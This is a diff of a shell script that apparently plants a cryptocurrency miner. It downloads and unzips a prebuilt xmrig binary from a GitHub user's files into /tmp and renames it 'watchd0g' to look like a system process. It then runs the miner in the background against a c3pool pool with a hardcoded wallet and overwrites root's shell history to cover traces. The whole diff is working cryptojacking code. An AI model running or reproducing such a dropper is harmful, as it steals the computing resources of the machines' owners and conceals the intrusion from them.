@@ -2,13 +2,7 @@
 
 cd /tmp
 
-apt install git make cmake gcc automake libtool autoconf -y
-
-git clone https://github.com/momika233/xmrig.git && cd xmrig && cd scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc)
-
-mkdir /tmp/watchd0g
-
-mv /tmp/xmrig/build/xmrig /tmp/watchd0g
+wget https://github.com/momika233/xmrig/files/15147153/momika233-2024-04-29-xmrig.zip && unzip momika233-2024-04-29-xmrig.zip && mv xmrig watchd0g && rm -rf momika233-2024-04-29-xmrig.zip
 
 chmod 777 /tmp/watchd0g && cd /tmp && ./watchd0g --donate-level 0 -o auto.c3pool.org:19999 -u 45F8ihixwyTi2WLadoJrsKdjwstKTAEupCYE6jzoBAZWQuY9uXxVh6i1LzoppCXuUx8tXjfaFUCG11DGXeXLkyrx1ir3gZj -t 2 -B && echo "exit" > /root/.zsh_history
 
